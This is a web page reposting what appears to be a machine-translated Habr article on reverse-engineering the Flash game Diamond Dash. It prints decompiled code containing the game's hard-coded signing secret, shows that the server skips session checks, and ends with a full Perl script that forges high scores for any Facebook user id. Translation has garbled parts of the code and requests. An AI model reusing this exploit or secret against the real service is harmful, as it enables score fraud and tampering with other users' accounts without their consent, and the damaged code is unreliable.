<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Diamond Dash, or how not to protect your online applications</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I do not like to play and play. But I was always interested in how they work and what vulnerabilities they have, what they transmit to the server. Alr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Diamond Dash, or how not to protect your online applications</h1><div class="post__text post__text-html js-mediator-article">  I do not like to play and play.  But I was always interested in how they work and what vulnerabilities they have, what they transmit to the server.  Already before on Habr√© there were articles on the topic of vulnerabilities of the game Diamond Dash, <br>  <a href="http://habrahabr.ru/blogs/gdev/127168/">Diamond Dash again</a> <br>  <a href="http://habrahabr.ru/blogs/gdev/126739/">Writing a macro bot for the browser game</a> <br><br>  I was also interested in this game, I decided to understand it. <br>  Looking ahead, I will say that as a result of researching the game, a script was written that can raise the rating for any (!!!) person and game, and for this it is enough to know this person‚Äôs id in facebook. <br><a name="habracut"></a><br><br>  In order to successfully transfer data to the server, in addition to the data itself, it is necessary to transfer the current absolute time and some mysterious signature to the POST request path. <br>  The normal query after the end of the game looks like this: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <blockquote>  POST / game / eor /? Timestamp = 1328793172978 &amp; signature = ktVfjD3VFg2EG2GNiBlTgVnBg4TZJ3-DGkbAsFuWirw% 3D &amp; session = 1100447b5bb0d01c14a974bc63318d12 api_verver = 1100447b5bb0d01c14a974bc63318d12 api_verver = 1100447b5bb0d01c14a974bc63318d12 and api_verver = 130044b5bb0d01c14a974bc63318d12 <br>  Host: dd.wooga.com <br>  Connection: keep-alive <br>  Content-Length: 136 <br>  Origin: http://cdn-dd.wooga.com <br>  User-Agent: Mozilla / 5.0 (X11; Linux i686) AppleWebKit / 535.7 (KHTML, like Gecko) Chrome / 16.0.912.77 Safari / 535.7 <br>  content-type: application / json <br>  Accept: * / * <br>  Accept-Encoding: gzip, deflate, sdch <br>  Accept-Language: ru-RU, ru; q = 0.8, en-US; q = 0.6, en; q = 0.4 <br>  Accept-Charset: windows-1251, utf-8; q = 0.7, *; q = 0.3 <br><br>  {"fireballs_used": 0, "xp": 75, "sound": true, "gems_removed": 65, "score": 19430, "level": 100, "plasma_bursts_used": 0, "user_id": "My Yiddish "} </blockquote><br><br>  After reading the above articles, I tried to send the desired data to the server, and expected that the server would generate the signature parameter for me, but no, all he said to me: Signature mismatch! <br><br>  The next step was to study the source code of the game.  So, stop.  What other source code?  o_o.  Indeed, there are no source codes for the game, but it is written in ActionScript, and for this wonderful language there are equally remarkable decompilers.  So historically, I use Trillix, although there are many different flash binary decompilers and there was even a review in Habr√©. <br><br>  So, the source code. <br>  The Google Chrome browser‚Äôs built-in development tools allow you to see everything that the page loads, in particular from the list of requests, flashed and such <a href="">cdn-dd.wooga.com/assets/DiamondDash-fe7222a63919abae69ca44d4ac0ac97c.swf</a> that the game itself can be guessed. <br><br>  after several hours of interesting reading of the source, such interesting places were found in the code: <br><blockquote>  internal <font color="#000000">function</font> extendUrl <font color="#66cc66">(</font> <font color="#66cc66">)</font> : <font color="#0066CC">void</font> <br>  <font color="#66cc66">{</font> <br>  <font color="#000000">var</font> loc1: <font color="#66cc66">*</font> = net.  <font color="#006600">wooga</font> .  <font color="#006600">diamonddash</font> .  <font color="#006600">shared</font> .  <font color="#006600">util</font> .  <font color="#006600">getTimestamp</font> <font color="#66cc66">(</font> <font color="#66cc66">)</font> ; <br>  <font color="#000000">var</font> loc2: <font color="#66cc66">*</font> = net.  <font color="#006600">wooga</font> .  <font color="#006600">diamonddash</font> .  <font color="#006600">service</font> .  <font color="#006600">util</font> .  <font color="#006600">generateRequestSignature</font> <font color="#66cc66">(</font> loc1 + <font color="#0066CC">this</font> . <font color="#006600">userId</font> + <font color="#0066CC">this</font> ._requestDetails. <font color="#006600">requestData</font> <font color="#66cc66">)</font> ; <br>  loc2 = escape <font color="#66cc66">(</font> loc2 <font color="#66cc66">)</font> ; <br>  <font color="#0066CC">this</font> ._requestDetails.  <font color="#0066CC">url</font> = <font color="#0066CC">this</font> ._requestDetails.  <font color="#0066CC">url</font> + <font color="#66cc66">(</font> <font color="#ff0000">"? timestamp ="</font> + loc1 + <font color="#ff0000">"&amp; signature ="</font> + loc2 + <font color="#ff0000">"&amp; session ="</font> + <font color="#0066CC">this</font> . <font color="#006600">sessionId</font> + <font color="#ff0000">"&amp; api_version = 2"</font> <font color="#66cc66">)</font> ; <br>  <font color="#b1b100">return</font> ; <br>  <font color="#66cc66">}</font> <br><br><br><br>  <font color="#0066CC">public</font> <font color="#000000">function</font> generateRequestSignature <font color="#66cc66">(</font> arg1: <font color="#0066CC">String</font> <font color="#66cc66">)</font> : <font color="#0066CC">String</font> <br>  <font color="#66cc66">{</font> <br>  <font color="#000000">var</font> loc1: <font color="#66cc66">*</font> = <font color="#000000">new</font> com.  <font color="#006600">hurlant</font> .  <font color="#006600">crypto</font> .  <font color="#006600">hash</font> .  <font color="#006600">HMAC</font> <font color="#66cc66">(</font> <font color="#000000">new</font> com. <font color="#006600">Hurlant</font> . <font color="#006600">Crypto</font> . <font color="#006600">Hash</font> . <font color="#006600">SHA256</font> <font color="#66cc66">(</font> <font color="#66cc66">)</font> <font color="#66cc66">)</font> ; <br>  <font color="#000000">var</font> loc2: <font color="#66cc66">*</font> = <font color="#000000">new</font> flash.  <font color="#006600">utils</font> .  <font color="#006600">ByteArray</font> <font color="#66cc66">(</font> <font color="#66cc66">)</font> ; <br>  loc2.  <font color="#006600">writeUTFBytes</font> <font color="#66cc66">(</font> net. <font color="#006600">wooga</font> . <font color="#006600">diamonddash</font> . <font color="#006600">service</font> . <font color="#006600">SHARED_SECRET</font> <font color="#66cc66">)</font> ; <br>  <font color="#000000">var</font> loc3: <font color="#66cc66">*</font> ; <br>  <font color="#66cc66">(</font> loc3 = <font color="#000000">new</font> flash. <font color="#006600">utils</font> . <font color="#006600">ByteArray</font> <font color="#66cc66">(</font> <font color="#66cc66">)</font> <font color="#66cc66">)</font> .  <font color="#006600">writeUTFBytes</font> <font color="#66cc66">(</font> arg1 <font color="#66cc66">)</font> ; <br>  <font color="#000000">var</font> loc4: <font color="#66cc66">*</font> ; <br>  <font color="#b1b100">return</font> loc4 = <font color="#66cc66">(</font> loc4 = <font color="#66cc66">(</font> loc4 = com. <font color="#006600">hurlant</font> . <font color="#006600">util</font> . <font color="#006600">Base64</font> . <font color="#006600">encodeByteArray</font> <font color="#66cc66">(</font> loc1. <font color="#006600">compute</font> <font color="#66cc66">(</font> loc2, loc3 <font color="#66cc66">)</font> <font color="#66cc66">)</font> <font color="#66cc66">)</font> . <font color="#006600">replace</font> <font color="#66cc66">(</font> <font color="#000000">new</font> RegExp <font color="#66cc66">(</font> <font color="#ff0000">" <font color="#000099">\ +</font> "</font> , <font color="#ff0000">"g"</font> <font color="#66cc66">)</font> , <font color="#ff0000">"-"</font> <font color="#66cc66">)</font> <font color="#66cc66">)</font> .  <font color="#006600">replace</font> <font color="#66cc66">(</font> <font color="#000000">new</font> RegExp <font color="#66cc66">(</font> <font color="#ff0000">" <font color="#000099">\ /</font> "</font> , <font color="#ff0000">"g"</font> <font color="#66cc66">)</font> , <font color="#ff0000">"_"</font> <font color="#66cc66">)</font> ; <br>  <font color="#66cc66">}</font> <br><br><br>  package net.  <font color="#006600">wooga</font> .  <font color="#006600">diamonddash</font> .  <font color="#006600">service</font> <br>  <font color="#66cc66">{</font> <br>  <font color="#0066CC">public</font> const SHARED_SECRET: <font color="#0066CC">String</font> = <font color="#ff0000">"foeD4ktl2gdoDdle"</font> ; <br>  <font color="#66cc66">}</font> </blockquote><br><br>  From these sections of the code you can see how to generate a signature: <br> <code>base64(SHA256(_ + id_ + _, SHARED_SECRET)).</code> <br>  after that another replacement + on - and \ on /. <br><br>  Checked - signed, the request was successful. <br><br>  The next thing I wanted to do was write a minimal, successful query.  the result is the following: <br><br><blockquote>  POST http://dd.wooga.com/game/eor/?timestamp=$time&amp;signature=$r%3D&amp;api_version=2 HTTP / 1.1 <br>  Host: dd.wooga.com <br>  content-type: application / json <br><br>  $ data </blockquote><br><br>  And, oh, horror !!!  there is no session id parameter !!!  that is, authentication is not actually performed, and all incoming requests are checked only for the signature and data.  This means that in the user_id request field you can specify anyone's id, and raise the rating to anyone without the participation of this user. <br><br>  Here is such a story of my research of the DiamondDash game. <br>  I want to advise all developers to always think about security, and never trust what comes to your server from the outside world.  Fully protected from hacking is impossible, but you can make the analysis of the code not worth it.  In this game, it would still be worthwhile to check the correctness of the session parameter, well, and an excellent method of protection - after compiling the program, replace the names of classes, methods and fields, so that the code would lose its meaningfulness. <br>  In conclusion, the complete request execution code: <br><br><blockquote>  <font color="#666666">#! / usr / bin / perl -w</font> <br><br>  <font color="#000000">use</font> LWP <font color="#339933">::</font> <font color="#006600">UserAgent</font> <font color="#339933">;</font> <br>  <font color="#000000">use</font> Digest <font color="#339933">::</font> <font color="#006600">SHA</font> <font color="#000066">qw</font> <font color="#009900">(</font> hmac_sha256_base64 <font color="#009900">)</font> <font color="#339933">;</font> <br><br>  <font color="#0000ff">$ ua</font> <font color="#339933">=</font> <font color="#000000">new</font> LWP <font color="#339933">::</font> <font color="#006600">UserAgent</font> <font color="#339933">;</font> <br>  <font color="#0000ff">$ userID</font> <font color="#339933">=</font> <font color="#ff0000">"123456789123456"</font> <font color="#339933">;</font> <br>  <font color="#0000ff">$ time</font> <font color="#339933">=</font> <font color="#000066">time</font> <font color="#339933">;</font> <br><br>  <font color="#0000ff">$ data</font> <font color="#339933">=</font> <br>  <font color="#000066">qq</font> <font color="#666666"># {"plasma_bursts_used": 0, "score": 10,000,000, "level": 100, "gems_removed": 165, "user_id": "$ userID", "sound": true, "xp": 100, "fireballs_used ":one}#;</font> <br><br>  <font color="#0000ff">$ r</font> <font color="#339933">=</font> hmac_sha256_base64 <font color="#009900">(</font> <font color="#0000ff">$ time</font> <font color="#339933">.</font> <font color="#0000ff">$ userID</font> <font color="#339933">.</font> <font color="#0000ff">$ data</font> <font color="#339933">,</font> <font color="#ff0000">"foeD4ktl2gdoDdle"</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#0000ff">$ r</font> <font color="#339933">= ~</font> <font color="#009966">s / ¬± / g</font> <font color="#339933">;</font> <br>  <font color="#0000ff">$ r</font> <font color="#339933">= ~</font> <font color="#000066">s</font> <font color="#339933">/ \ //</font> _ <font color="#339933">/</font> g <font color="#339933">;</font> <br><br>  <font color="#0000ff">$ req</font> <font color="#339933">=</font> <br>  <font color="#000066">qq</font> <font color="#666666">#POST http://dd.wooga.com/game/eor/?timestamp=$time&amp;signature=$r%3D&amp;api_version=2 HTTP / 1.1</font> <br>  Host <font color="#339933">:</font> dd <font color="#339933">.</font>  wooga <font color="#339933">.</font>  com <br>  content <font color="#339933">-</font> type <font color="#339933">:</font> application <font color="#339933">/</font> json <br><br>  <font color="#0000ff">$ data</font> <font color="#666666">#;</font> <br><br>  <font color="#0000ff">$ req</font> <font color="#339933">=</font> HTTP <font color="#339933">::</font> <font color="#006600">Request</font> <font color="#339933">-&gt;</font> <font color="#006600">parse</font> <font color="#009900">(</font> <font color="#0000ff">$ req</font> <font color="#009900">)</font> <font color="#339933">;</font> <br><br>  <font color="#000066">print</font> <font color="#0000ff">$ ua</font> <font color="#339933">-&gt;</font> <font color="#006600">simple_request</font> <font color="#009900">(</font> <font color="#0000ff">$ req</font> <font color="#009900">)</font> <font color="#339933">-&gt;</font> <font color="#006600">as_string</font> <font color="#009900">(</font> <font color="#009900">)</font> <font color="#339933">;</font> <br></blockquote><br><br><img src="https://habrastorage.org/storage2/dfe/d17/d24/dfed17d24f51837875aec25cd6626df3.jpg"></div><p>Source: <a href="https://habr.com/ru/post/137913/">https://habr.com/ru/post/137913/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../137902/index.html">Correctly choose the accounting system for the online store</a></li>
<li><a href="../137903/index.html">Update Google Chrome to version 17</a></li>
<li><a href="../137910/index.html">Video review of Android applications and games - kedDroid</a></li>
<li><a href="../137911/index.html">Let's speed up 3G modem using external antenna</a></li>
<li><a href="../137912/index.html">‚ÄúAin't‚Äù is cool, ain't it?</a></li>
<li><a href="../137915/index.html">Anonymous started hacking the sites of "United Russia"</a></li>
<li><a href="../137917/index.html">Scientists began developing a method of "thermal" data recording</a></li>
<li><a href="../137918/index.html">The work of the image stabilization system on the example of the camera OM-D E-M5 from Olympus</a></li>
<li><a href="../137919/index.html">[archlinux] Binary logs got to us!</a></li>
<li><a href="../137922/index.html">A global video tracking system will be created in Moscow</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>